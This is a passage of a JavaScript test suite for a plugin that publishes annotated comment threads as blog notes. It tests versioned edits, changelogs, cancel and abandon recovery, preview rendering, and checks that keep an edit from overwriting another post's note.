  const b2 = boot(rig2, { page: blygPage([thread('notes')]) });
  const away = await b2.pub.start({ page: b2.pages.get(b2.page.url), threadId: 't1', scope: 'one', shown: 'never', presence: 'away' });
  assert.deepEqual([away.ok, away.park], [false, 'notes-read']);
  assert.deepEqual(rig2.calls(), []);
  // a passage that used only the web publishes straight
  const rig3 = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note', '--quick'] } }); t.after(rig3.done);
  const b3 = boot(rig3, { page: blygPage([thread('web')]) });
  const w = await b3.start('t1', 'one', 'never');
  assert.deepEqual([w.view.confirm, w.view.review], ['never', 'none']);
  await until(() => b3.mode() === 'published', 'published');
});

test('"this and the ones above" with one click counts only threads typed in the drawer', async t => {
  const rig = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note'] } }); t.after(rig.done);
  const page = blygPage([
    { id: 'a', quote: 'q', blyg: stamp(), msgs: [mine('Typed through a script.', { channel: 'api' })] },
    { id: 'b', quote: 'q', blyg: stamp(), msgs: [mine('Typed in the drawer.', { channel: 'drawer' })] },
    { id: 'c', quote: 'q', blyg: stamp(), msgs: [mine('Typed on the reading room page.', { channel: 'reading-room' })] },
    { id: 'd', quote: 'q', blyg: stamp(), msgs: [mine('This one.', { channel: 'drawer' })] }]);
  const b = boot(rig, { page });
  const r = await b.start('d', 'above', 'never');
  assert.ok(r.ok, r.error);
  assert.deepEqual(r.view.thread_ids, ['b', 'd']);
  b.pub.stopAll();
});

test('a full build-and-check is timed for "about N minutes" (only without the quick flag), and the next run says so', async t => {
  const rig = makeRig(); t.after(rig.done);
  const b = boot(rig);
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  assert.deepEqual([v.pace, v.full_minutes], ['full', null]);
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published');
  const d = JSON.parse(fs.readFileSync(path.join(path.dirname(b.file), 'blyg-publish-durations.json'), 'utf8'));
  assert.ok(Number.isFinite(d[rig.top].apply_ms));
  b.pages.get(b.page.url).threads.push(thread('t9', 'q', 'Another thought.', { blyg: stamp() }));
  (await b.start('t9')); await until(() => b.mode() === 'planned', 'planned 2');
  assert.equal(b.pub.current().full_minutes, 1, 'rounded up to a minute: never "0 minutes"');
});

test('PUBLISHING AGAIN: a new version of the same post — same file, id, address and created; the changelog written from the difference; the edit commands; nothing changed → refused; all comments gone → refused', async t => {
  const rig = makeRig({ discard: true, extra: {} }); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  const page = blygPage([{ id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('First comment.', { ts: '1' }), mine('Second comment.', { ts: '2' })] }]);
  const b = boot(rig, { page, config: home });
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  const rel = recOf(v).note_rel;
  const first = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published');
  const p1 = b.pages.get(b.page.url).threads[0].blyg_published;
  assert.equal(p1.version, 1);
  // nothing changed
  const same = await b.start();
  assert.deepEqual([same.ok, same.error], [false, 'Nothing has changed since you published this.']);
  // the owner edits the second comment
  b.pages.get(b.page.url).threads[0].msgs[1].text = 'Second comment, sharper.';
  const e = await b.start();
  assert.ok(e.ok, e.error);
  assert.deepEqual([e.view.kind, e.view.version, e.view.changelog], ['edit', 2, 'Edited the second comment.']);
  await until(() => b.mode() === 'planned', 'planned (edit)');
  v = b.pub.current();
  assert.equal(recOf(v).note_rel, rel, 'the SAME note file');
  const second = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  const fm = t2 => t2.split('\n---\n')[0];
  for (const k of ['blyg_id', 'permalink', 'created', 'released']) assert.equal(new RegExp(`^${k}: .*$`, 'm').exec(fm(second))[0], new RegExp(`^${k}: .*$`, 'm').exec(fm(first))[0], `${k} kept`);
  assert.match(second, /Second comment, sharper\./);
  const planEdit = rig.calls().at(-1);
  assert.deepEqual([planEdit.step, planEdit.argv.at(-1)], ['plan_edit', 'Edited the second comment.'], 'the edit command, with the changelog line as ONE argument');
  // cancel: the published text goes back, exactly
  await b.pub.cancel({ id: v.id, token: v.token });
  assert.equal(fs.readFileSync(path.join(rig.top, rel), 'utf8'), first, 'cancelling a new version puts the published note back');
  // again, and publish it
  const e2 = await b.start(); await until(() => b.mode() === 'planned', 'planned (edit 2)');
  v = b.pub.current();
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published v2');
  assert.deepEqual(rig.calls().slice(-2).map(c => c.step), ['apply_edit', 'publish_edit']);
  const p2 = b.pages.get(b.page.url).threads[0].blyg_published;
  assert.deepEqual([p2.version, p2.permalink, p2.address], [2, p1.permalink, p1.address]);
  void e2;
  // add a comment and edit the first: one line
  const th = b.pages.get(b.page.url).threads[0];
  th.msgs[0].text = 'First comment, edited.'; th.msgs.push(mine('A third comment.', { ts: '3' }));
  const e3 = await b.start();
  assert.equal(e3.view.changelog, 'Edited the first comment and added one.');
  await until(() => b.mode() === 'planned', 'planned (edit 3)');
  v = b.pub.current(); await b.pub.cancel({ id: v.id, token: v.token });
  // every comment gone
  th.msgs = [];
  const gone = await b.start();
  assert.deepEqual([gone.ok, gone.error], [false, 'Withdrawing a post is done on your site, not from here.']);
  // the note changed OUTSIDE the plugin (by hand, then published with the site's own command): the owner is asked, nothing is written
  th.msgs = [mine('First comment, edited.', { ts: '1' })];
  fs.appendFileSync(path.join(rig.top, rel), '\nedited by hand\n');
  const handText = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  const calls = rig.calls().length;
  const hand = await b.start();
  assert.deepEqual([hand.ok, hand.status, hand.error], [false, 409, R.OUTSIDE_SAY]);
  assert.deepEqual(hand.outside, { say: R.OUTSIDE_SAY, lost: 3 }, 'the sentence and how many lines would not be kept (a count, never the text): the hand-written line and the two comments no longer in the thread');
  assert.equal(fs.readFileSync(path.join(rig.top, rel), 'utf8'), handText, 'KEEP: nothing is written');
  assert.equal(rig.calls().length, calls, 'and nothing is run');
  assert.equal(b.mode(), 'cancelled', 'no run was started (the start held the run while it looked, then put it back)');
  assert.deepEqual(R.OUTSIDE_ANSWERS, ['keep', 'replace']);
  assert.equal((await b.pub.start({ page: b.pages.get(b.page.url), threadId: 't1', scope: 'one', shown: 'always', outside: 'keep' })).status, 400, 'only replace is ever sent');
  // REPLACE: the same start with outside: 'replace' goes ahead, rebuilding the note from the thread
  const rep = await b.pub.start({ page: b.pages.get(b.page.url), threadId: 't1', scope: 'one', shown: 'always', outside: 'replace' });
  assert.ok(rep.ok, rep.error);
  assert.equal(rep.view.kind, 'edit');
  await until(() => b.mode() === 'planned', 'planned (replace)');
  v = b.pub.current();
  assert.ok(!/edited by hand/.test(fs.readFileSync(path.join(rig.top, rel), 'utf8')), 'the thread\'s text replaces the outside edit');
  // cancelling a replace puts the outside edit back exactly
  await b.pub.cancel({ id: v.id, token: v.token });
  assert.equal(fs.readFileSync(path.join(rig.top, rel), 'utf8'), handText);
  await b.pub.start({ page: b.pages.get(b.page.url), threadId: 't1', scope: 'one', shown: 'always', outside: 'replace' });
  await until(() => b.mode() === 'planned', 'planned (replace 2)');
  v = b.pub.current();
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published (replace)');
  // from then on the record holds the new note's hash: the next press is an ordinary one
  const after = await b.start();
  assert.deepEqual([after.ok, after.error], [false, 'Nothing has changed since you published this.']);
});

test('the start refuses while the last record\'s step process is still alive', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const sl = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 30000)'], { detached: true, stdio: 'ignore' });
  t.after(() => { try { process.kill(-sl.pid, 'SIGKILL'); } catch { /* gone */ } });
  const file = path.join(rig.out, 'run-forgot.json');
  fs.writeFileSync(file, JSON.stringify({ mode: 'abandoned', id: 'abcdefabcdefabcd', token: 't', child: { pgid: sl.pid, lstart: 'S' } }));
  const pub = R.createPublisher({ file, now: () => NOW, broadcast: () => {}, lstartOf: () => 'S', readConfig: () => ({ blyg_home: rig.home }), readPage: () => null, savePage: () => {} });
  const r = await pub.start({ page: blygPage([thread('t1', 'q', 'w', { blyg: stamp() })]), threadId: 't1', scope: 'one', shown: 'always' });
  assert.deepEqual([r.ok, r.error], [false, 'The earlier step is still running: stop it first.']);
});

test('the picture of the draft: one named state, rendered only for a run waiting on the owner with a preview address, never from a client address; unavailable never blocks', async t => {
  const rig = makeRig({ extra: { preview_url: 'http://127.0.0.1:9/preview{permalink}' } }); t.after(rig.done);
  const asked = [];
  let answer = { state: 'ready', png: Buffer.from('PNG') };
  const pages = new Map(); const page = blygPage([thread('t1', 'q', 'A thought.', { blyg: stamp() })]); pages.set(page.url, page);
  const pub = R.createPublisher({ file: path.join(rig.out, 'run-pic.json'), now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: rig.home }), readPage: u => pages.get(u), savePage: () => {},
    chrome: '/no/chrome', previewApartMs: 5, render: async o => { asked.push(o); return answer; } });
  for (const [from, to, okk] of [['off', 'waiting', true], ['off', 'ready', false], ['waiting', 'ready', true], ['ready', 'waiting', true], ['unavailable', 'waiting', true], ['waiting', 'off', true]]) {
    const p = { state: from };
    if (okk) assert.equal(R.previewMove(p, to).state, to); else assert.throws(() => R.previewMove(p, to), /cannot go/);
  }
  assert.ok((await pub.start({ page, threadId: 't1', scope: 'one', shown: 'always' })).ok);
  await until(() => pub.current().mode === 'planned', 'planned');
  const v = pub.current();
  assert.equal(pub.previewOf({ id: v.id, token: 'x'.repeat(32) }).status, 404);
  assert.equal(pub.previewOf({ id: v.id, token: v.token, theme: 'dark' }).state, 'waiting');
  await until(() => pub.previewOf({ id: v.id, token: v.token, theme: 'dark' }).state === 'ready', 'ready');
  assert.equal(String(pub.previewOf({ id: v.id, token: v.token, theme: 'dark' }).png), 'PNG');
  assert.deepEqual([asked[0].url, asked[0].theme, asked[0].selector], [`http://127.0.0.1:9/preview${v.permalink}`, 'dark', 'article'], 'the address is the setting and the run\'s own permalink');
  answer = { state: 'missing', why: 'not there yet' };
  assert.equal(pub.previewOf({ id: v.id, token: v.token, theme: 'dark', fresh: true }).state, 'waiting');
  await until(() => pub.previewOf({ id: v.id, token: v.token, theme: 'dark' }).state === 'unavailable', 'unavailable after the tries');
  assert.equal(asked.length, 1 + R.PREVIEW_TRIES.times, 'asked again a few times while the page is not there yet');
  assert.ok((await pub.confirm({ id: v.id, token: v.token })).ok, 'an unavailable picture never blocks publishing');
  assert.equal(pub.previewOf({ id: v.id, token: v.token }).state, 'off', 'and once the run moved on there is nothing to render');
  await until(() => pub.current().mode === 'published', 'published');
});

// A NEW VERSION given up where the site certainly published nothing puts the published text back (when the note is still what the
// run wrote), so the next "publish again" is not refused; where a push may have happened the note is left, the owner is told in one
// sentence what to do, and Forget is offered. One run per mode.
test('an edit given up: the published text goes back in every mode that published nothing; after a publish that may have pushed it is left, with one sentence and Forget', async t => {
  const editRig = async (tag) => {
    const rig = makeRig({ discard: true }); t.after(rig.done);
    const cmd = step => [process.execPath, FAKE, rig.log, rig.ctl, step, '{note}'];
    const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig), abandon: cmd('abandon') } };
    const page = blygPage([{ id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('First comment.', { ts: '1' })] }]);
    const b = boot(rig, { page, config: home });
    (await b.start()); await until(() => b.mode() === 'planned', `planned ${tag}`);
    let v = b.pub.current();
    await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', `published ${tag}`);
    const rel = recOf(v).note_rel;
    const published = fs.readFileSync(path.join(rig.top, rel), 'utf8');
    b.pages.get(b.page.url).threads[0].msgs[0].text = 'First comment, sharper.';
    const e = await b.start(); assert.ok(e.ok, e.error);
    await until(() => b.mode() === 'planned', `planned edit ${tag}`);
    v = b.pub.current();
    assert.match(fs.readFileSync(path.join(rig.top, rel), 'utf8'), /sharper/);
    return { rig, home, b, v, rel, published, noteNow: () => fs.readFileSync(path.join(rig.top, rel), 'utf8') };
  };
  // restart a publisher from the record as it is now, with the record's mode set to `mode` (what a companion that stopped there finds)
  const restartAt = (x, mode) => {
    const rec = JSON.parse(fs.readFileSync(x.b.file, 'utf8'));
    const file = path.join(x.rig.out, `run-${mode}.json`);
    fs.writeFileSync(file, JSON.stringify({ ...rec, mode }));
    return R.createPublisher({ file, now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: x.home }), readPage: u => x.b.pages.get(u), savePage: p => x.b.pages.set(p.url, p),
      posts: path.join(path.dirname(x.b.file), 'blyg-publish-posts.json') });
  };
  const againOk = async (x, pub) => {
    // the next "publish again" is not refused for a note left rewritten
    x.b.pages.get(x.b.page.url).threads[0].msgs[0].text = 'First comment, sharper still.';
    const r = await pub.start({ page: x.b.pages.get(x.b.page.url), threadId: 't1', scope: 'one', shown: 'always' });
    assert.ok(r.ok, r.error);
  };

  // failed_apply
  { const x = await editRig('failed_apply');
    x.rig.control({ apply_edit: 'fail' });
    await x.b.pub.confirm({ id: x.v.id, token: x.v.token }); await until(() => x.b.mode() === 'failed_apply', 'failed_apply');
    x.rig.control({});
    const a = await x.b.pub.abandon({ id: x.v.id, token: x.v.token });
    assert.ok(a.ok, a.error);
    assert.deepEqual([a.view.cleanup.outcome, x.noteNow() === x.published], ['undone', true], 'failed apply: the published text is back');
    await againOk(x, x.b.pub); }
  // interrupted_applying and interrupted_applied (the companion stopped during apply, or after it and before publish began)
  for (const mode of ['applying', 'applied']) {
    const x = await editRig(mode);
    x.rig.control({ apply_edit: 'sleep' });
    await x.b.pub.confirm({ id: x.v.id, token: x.v.token });
    await until(() => x.rig.calls().some(c => c.step === 'apply_edit'), 'apply started');
    const sleeper = x.rig.calls().at(-1).pid;
    const pub = restartAt(x, mode);
    x.b.pub.stopAll(); try { process.kill(sleeper, 'SIGKILL'); } catch { /* gone */ }
    await until(() => { try { process.kill(sleeper, 0); return false; } catch { return true; } }, 'the step gone');
    x.rig.control({});
    const v = pub.current();
    assert.equal(v.mode, `interrupted_${mode}`);
    assert.equal(v.unsure, '', 'nothing could have been published: no doubt to tell');
    const a = await pub.abandon({ id: v.id, token: v.token });
    assert.ok(a.ok, a.error);
    assert.deepEqual([a.view.cleanup.outcome, x.noteNow() === x.published], ['undone', true], `interrupted_${mode}: the published text is back`);
    await againOk(x, pub);
  }
  // abandon_failed after a failed apply: abandon again puts it back too
  { const x = await editRig('abandon_failed');
    x.rig.control({ apply_edit: 'fail' });
    await x.b.pub.confirm({ id: x.v.id, token: x.v.token }); await until(() => x.b.mode() === 'failed_apply', 'failed_apply');
    x.rig.control({ abandon: 'fail' });
    const bad = await x.b.pub.abandon({ id: x.v.id, token: x.v.token });
    assert.equal(bad.ok, false); assert.equal(x.b.mode(), 'abandon_failed');
    assert.match(x.noteNow(), /sharper/, 'not yet');
    x.rig.control({});
    const a = await x.b.pub.abandon({ id: x.v.id, token: x.v.token });
    assert.ok(a.ok, a.error);
    assert.deepEqual([a.view.cleanup.outcome, x.noteNow() === x.published], ['undone', true], 'abandon again (from a failed apply): put back'); }
  // failed_publish: the publish may have pushed — the note is left, one sentence, Forget offered (and Start over still)
  { const x = await editRig('failed_publish');
    x.rig.control({ publish_edit: 'fail' });
    await x.b.pub.confirm({ id: x.v.id, token: x.v.token }); await until(() => x.b.mode() === 'failed_publish', 'failed_publish');
    const v = x.b.pub.current();
    assert.equal(v.unsure, R.EDIT_UNSURE_SAY);
    assert.deepEqual(v.can, ['retry', 'abandon', 'forget']);
    x.rig.control({});
    const a = await x.b.pub.abandon({ id: v.id, token: v.token });
    assert.ok(a.ok, a.error);
    assert.equal(a.view.cleanup.outcome, 'left');
    assert.match(a.view.cleanup.said, /may already have published the new version/);
    assert.match(x.noteNow(), /sharper/, 'not put back: the site may show it'); }
  // interrupted_publishing: Forget ends it here, nothing run, the note left, the same sentence
  { const x = await editRig('publishing');
    x.rig.control({ publish_edit: 'sleep' });
    await x.b.pub.confirm({ id: x.v.id, token: x.v.token });
    await until(() => x.rig.calls().some(c => c.step === 'publish_edit'), 'publish started');
    const sleeper = x.rig.calls().at(-1).pid;
    const pub = restartAt(x, 'publishing');
    x.b.pub.stopAll(); try { process.kill(sleeper, 'SIGKILL'); } catch { /* gone */ }
    await until(() => { try { process.kill(sleeper, 0); return false; } catch { return true; } }, 'the step gone');
    x.rig.control({});
    const v = pub.current();
    assert.deepEqual([v.mode, v.unsure, v.can], ['interrupted_publishing', R.EDIT_UNSURE_SAY, ['continue', 'abandon', 'forget']]);
    const before = x.rig.calls().length;
    const f = await pub.forget({ id: v.id, token: v.token });
    assert.ok(f.ok, f.error);
    assert.equal(f.view.cleanup.outcome, 'forgotten');
    assert.match(f.view.cleanup.said, /may already have published the new version/);
    assert.equal(x.rig.calls().length, before, 'nothing was run on the site');
    assert.match(x.noteNow(), /sharper/); }
  // a NEW post (not an edit) after a failed publish: no doubt sentence, no Forget (abandon runs the site's own abandon)
  { const rig = makeRig(); t.after(rig.done);
    const b = boot(rig);
    rig.control({ publish: 'fail' });
    (await b.start()); await until(() => b.mode() === 'planned', 'planned');
    const v0 = b.pub.current();
    await b.pub.confirm({ id: v0.id, token: v0.token }); await until(() => b.mode() === 'failed_publish', 'failed_publish (new)');
    assert.deepEqual([b.pub.current().unsure, b.pub.current().can], ['', ['retry', 'abandon']]); }
});

test('the cleanup is ONE named outcome; an older record\'s two booleans are read as it', () => {
  assert.deepEqual(R.CLEANUP_OUTCOMES, ['undone', 'left', 'forgotten']);
  for (const [old, want] of [[{ removed: true }, 'undone'], [{ removed: false, forgotten: true }, 'forgotten'], [{ removed: false }, 'left']]) {
    const m = R.migrateRecord({ mode: 'abandoned', cleanup: { said: 'x', ...old } });
    assert.deepEqual(m.cleanup, { said: 'x', outcome: want });
  }
});

test('the picture\'s state changes only by previewMove: no other assignment to it in the publisher (the one initial value aside)', () => {
  const src = fs.readFileSync(new URL('../blyg-run.mjs', import.meta.url), 'utf8');
  const assigns = [...src.matchAll(/(?<![.\w])preview(?:\.state)?\s*=(?!=)/g)].map(m => src.slice(m.index, m.index + 40));
  assert.deepEqual(assigns, ["preview = { state: 'off', run: '', theme"], assigns.join('\n'));
  assert.ok(/p\.state = to;/.test(src), 'previewMove is the one place that writes it');
});

// A NEW VERSION AIMED AT ANOTHER POST'S NOTE. The companion's record of what it published (blyg-publish-posts.json) is a file on
// disk: if it named another post's note, each of the edit's own checks alone stops the rewrite, and that other note is untouched.
test('an edit aimed at another post\'s note: the id check, the address check and the plain-file check each stop it alone', async t => {
  const rig = makeRig(); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  const page = blygPage([{ id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('Post A words.', { ts: '1' })] },
    { id: 't2', quote: 'Another passage.', blyg: stamp(), msgs: [mine('Post B words.', { ts: '2' })] }]);
  const b = boot(rig, { page, config: home });
  const sha = t2 => crypto.createHash('sha256').update(t2).digest('hex');
  for (const id of ['t1', 't2']) {
    const s = await b.start(id); assert.ok(s.ok, s.error);
    await until(() => b.mode() === 'planned', `planned ${id}`);
    const v = b.pub.current(); await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', `published ${id}`);
  }
  const postsFile = path.join(rig.out, 'blyg-publish-posts.json');
  const posts = JSON.parse(fs.readFileSync(postsFile, 'utf8'));
  const [pa, pb] = ['t1', 't2'].map(id => b.pages.get(b.page.url).threads.find(x => x.id === id).blyg_published.permalink);
  const A = posts[pa]; const B = posts[pb];
  const textOf = rel => fs.readFileSync(path.join(rig.top, rel), 'utf8');
  const aText = textOf(A.note_rel); const bText = textOf(B.note_rel);
  const tryEdit = async (patch, words) => {
    fs.writeFileSync(postsFile, JSON.stringify({ ...posts, ...patch }));
    b.pages.get(b.page.url).threads.find(x => x.id === 't1').msgs[0].text = words;
    return b.start('t1');
  };
  // 1. the ID: A's record names B's note (with B's own hash): B's note does not carry A's id
  let r = await tryEdit({ [pa]: { ...A, note_rel: B.note_rel, note_sha: sha(bText) } }, 'Post A, edited once.');
  assert.deepEqual([r.ok, r.error], [false, 'The note of this post does not carry the post\'s id, so it is not rewritten from here.']);
  assert.equal(textOf(B.note_rel), bText, 'B is untouched');
  // 2. the ADDRESS: B's thread is edited, but B's record names A's note and id: the address the note makes is A's, not B's
  b.pages.get(b.page.url).threads.find(x => x.id === 't2').msgs[0].text = 'Post B, edited.';
  fs.writeFileSync(postsFile, JSON.stringify({ ...posts, [pb]: { ...B, note_rel: A.note_rel, note_sha: sha(aText), blyg_id: A.blyg_id } }));
  r = await b.start('t2');
  assert.deepEqual([r.ok, r.error], [false, 'The post\'s address would change, so a new version is not written from here.']);
  assert.equal(textOf(A.note_rel), aText, 'A is untouched');
  b.pages.get(b.page.url).threads.find(x => x.id === 't2').msgs[0].text = 'Post B words.';
  // 3. a LINK: A's record names a link in the notes folder (same id, same hash) whose target is elsewhere: it is not a plain file
  const outside = path.join(rig.out, 'elsewhere.md');
  fs.writeFileSync(outside, aText);
  const link = path.join(rig.folder, 'a-link.md');
  fs.symlinkSync(outside, link);
  r = await tryEdit({ [pa]: { ...A, note_rel: path.relative(rig.top, link).split(path.sep).join('/'), note_sha: sha(aText) } }, 'Post A, edited twice.');
  assert.deepEqual([r.ok, r.error], [false, 'The note of this post is not a plain file, so it is not rewritten from here.']);
  assert.equal(fs.readFileSync(outside, 'utf8'), aText, 'the link\'s target is untouched');
  // and with the true record, the edit goes ahead
  fs.writeFileSync(postsFile, JSON.stringify(posts));
  r = await b.start('t1');
  assert.ok(r.ok, r.error);
});

test('a second press of Try again while the retry is already running is answered "It is already trying again." and does nothing', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const b = boot(rig);
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  rig.control({ apply: 'fail' });
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'failed_apply', 'failed');
  rig.control({ apply: 'sleep' });
  v = b.pub.current();
  assert.ok((await b.pub.retry({ id: v.id, token: v.token })).ok);
  await until(() => b.mode() === 'applying' && rig.calls().filter(c => c.step === 'apply').length === 2, 'retrying');
  const late = await b.pub.retry({ id: v.id, token: v.token });
  assert.deepEqual([late.ok, late.status, late.error, late.view.mode, late.view.can], [false, 409, 'It is already trying again.', 'applying', []]);
  assert.equal(rig.calls().filter(c => c.step === 'apply').length, 2, 'nothing ran twice');
  b.pub.stopAll();
});

// ---- adding a comment to the earlier post from the same page (JOINS) ----------------------------------------------------------------
// what the dialog was shown, carried by the start (the post's id and version)
const addArgs = (pub, page, threadId) => { const e = pub.earlierOf({ page, threadId }).earlier || {}; return { join: 'add', post: e.post || '', postVersion: String(e.version || '') }; };
test('ADD TO THE EARLIER POST: a second comment from the same page becomes the next version of the post (same file, id and address), both threads in the order published; the plane on either thread republishes the whole post', async t => {
  assert.deepEqual(R.JOINS, ['add', 'new']);
  const rig = makeRig({ discard: true }); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  // t2 is ABOVE t1 on the page, but is added later: the post keeps the order in which they went in
  const page = blygPage([{ id: 't2', quote: 'A later passage.', blyg: stamp(), msgs: [mine('Second thought, from further up.', { ts: '5' })] },
    { id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('First thought.', { ts: '1' })] }]);
  const b = boot(rig, { page, config: home });
  const P = () => b.pages.get(b.page.url);
  // nothing published from this page yet: nothing to add to
  assert.deepEqual(b.pub.earlierOf({ page: P(), threadId: 't2' }), { ok: true, earlier: null, own: null });
  assert.deepEqual([(await b.pub.start({ page: P(), threadId: 't2', scope: 'one', shown: 'always', ...addArgs(b.pub, P(), 't2') })).error], [R.ADD_GONE_SAY], 'add with nothing to add to: refused, nothing started');
  assert.equal(b.mode(), 'idle');
  // publish t1 on its own
  (await b.start('t1')); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  const rel = recOf(v).note_rel;
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published');
  const v1 = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  const p1 = P().threads[1].blyg_published;
  // the offer for t2 names that post; a published thread is never offered it; a bad choice is refused
  assert.deepEqual(b.pub.earlierOf({ page: P(), threadId: 't2' }), { ok: true, earlier: { title: p1.title, version: 1, post: p1.permalink.split('/').pop(), prompts: 'locked', agent_text: false }, own: null });
  // THE POST SHOWN IS THE POST ADDED TO: another id, another version, or none: refused, nothing started
  for (const wrong of [{ post: 'x'.repeat(26), postVersion: '1' }, { post: p1.permalink.split('/').pop(), postVersion: '2' }, {}]) {
    const r = await b.pub.start({ page: P(), threadId: 't2', scope: 'one', shown: 'always', join: 'add', ...wrong });
    assert.deepEqual([r.ok, r.error], [false, R.ADD_CHANGED_SAY], JSON.stringify(wrong));
  }
  assert.equal(b.mode(), 'published', 'nothing was started (the start held the run while it looked, then put it back)');
  assert.deepEqual(b.pub.earlierOf({ page: P(), threadId: 't1' }).earlier, null);
  assert.equal((await b.pub.start({ page: P(), threadId: 't2', scope: 'one', shown: 'always', join: 'merge' })).status, 400);
  assert.equal((await b.pub.start({ page: P(), threadId: 't2', scope: 'above', shown: 'always', join: 'add' })).status, 400);
  // add t2
  const n = fs.readdirSync(rig.folder).length;
  const a = await b.pub.start({ page: P(), threadId: 't2', scope: 'one', shown: 'always', ...addArgs(b.pub, P(), 't2') });
  assert.ok(a.ok, a.error);
  assert.deepEqual([a.view.kind, a.view.version, a.view.changelog, a.view.thread_ids], ['edit', 2, 'Added a comment.', ['t1', 't2']]);
  await until(() => b.mode() === 'planned', 'planned (add)');
  v = b.pub.current();
  assert.equal(recOf(v).note_rel, rel, 'the SAME note file');
  assert.equal(fs.readdirSync(rig.folder).length, n, 'no second note');
  const v2 = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  const fm = t2 => t2.split('\n---\n')[0];
  for (const k of ['blyg_id', 'permalink', 'created', 'released']) assert.equal(new RegExp(`^${k}: .*$`, 'm').exec(fm(v2))[0], new RegExp(`^${k}: .*$`, 'm').exec(fm(v1))[0], `${k} kept`);
  const body = v2.split('\n---\n')[1];
  assert.ok(body.indexOf('First thought.') < body.indexOf('A passage.') && body.indexOf('A passage.') < body.indexOf('Second thought, from further up.')
    && body.indexOf('Second thought, from further up.') < body.indexOf('A later passage.'), 'comment, quote, then the added comment and its quote');
  assert.deepEqual([rig.calls().at(-1).step, rig.calls().at(-1).argv.at(-1)], ['plan_edit', 'Added a comment.']);
  assert.deepEqual(v.reading.filter(x => x.kind === 'quote').map(x => x.text), ['A passage.', 'A later passage.']);
  // cancel: version 1's text is back exactly, t2 is not marked
  await b.pub.cancel({ id: v.id, token: v.token });
  assert.equal(fs.readFileSync(path.join(rig.top, rel), 'utf8'), v1);
  assert.equal(P().threads[0].blyg_published, undefined);
  // again, and publish it
  (await b.pub.start({ page: P(), threadId: 't2', scope: 'one', shown: 'always', ...addArgs(b.pub, P(), 't2') })); await until(() => b.mode() === 'planned', 'planned (add 2)');
  v = b.pub.current();
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published v2');
  assert.deepEqual(rig.calls().slice(-2).map(c => c.step), ['apply_edit', 'publish_edit']);
  const [m2, m1] = P().threads.map(x => x.blyg_published);
  assert.deepEqual([m1.version, m2.version, m2.permalink, m1.permalink], [2, 2, p1.permalink, p1.permalink], 'both threads carry the post, at version 2');
  const kept = JSON.parse(fs.readFileSync(path.join(path.dirname(b.file), 'blyg-publish-posts.json'), 'utf8'))[p1.permalink];
  assert.deepEqual(kept.thread_ids, ['t1', 't2']);
  const twoThreads = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  // the plane on EITHER thread: the whole post again, in the same order, as version 3
  P().threads[1].msgs[0].text = 'First thought, sharper.';
  const e = await b.start('t2');
  assert.ok(e.ok, e.error);
  assert.deepEqual([e.view.kind, e.view.version, e.view.changelog, e.view.thread_ids], ['edit', 3, 'Edited the first comment.', ['t1', 't2']]);
  await until(() => b.mode() === 'planned', 'planned (v3)');
  const v3 = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  assert.ok(v3.indexOf('First thought, sharper.') < v3.indexOf('Second thought, from further up.'));
  v = b.pub.current(); await b.pub.cancel({ id: v.id, token: v.token });
  assert.equal(fs.readFileSync(path.join(rig.top, rel), 'utf8'), twoThreads);
  const e1 = await b.start('t1');
  assert.deepEqual([e1.ok, e1.view && e1.view.version, e1.view && e1.view.thread_ids], [true, 3, ['t1', 't2']]);
  await until(() => b.mode() === 'planned', 'planned (v3 from t1)');
});

test('ADD TO THE EARLIER POST is offered only for a post whose note is still the one written from here, for the most recent post from the page, with room, and the same one target', async t => {
  const rig = makeRig({ discard: true }); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  const page = blygPage([{ id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('First thought.', { ts: '1' })] },
    { id: 't2', quote: 'Another.', blyg: stamp(), msgs: [mine('Second post of its own.', { ts: '2' })] },
    { id: 't3', quote: 'A third.', blyg: stamp(), msgs: [mine('A third thought.', { ts: '3' })] }]);
  const b = boot(rig, { page, config: home });
  const P = () => b.pages.get(b.page.url);
  const publish = async (id, join) => {
    const r = await b.pub.start({ page: P(), threadId: id, scope: 'one', shown: 'always', ...(join ? { join } : {}) });
    assert.ok(r.ok, r.error); await until(() => b.mode() === 'planned', `planned ${id}`);
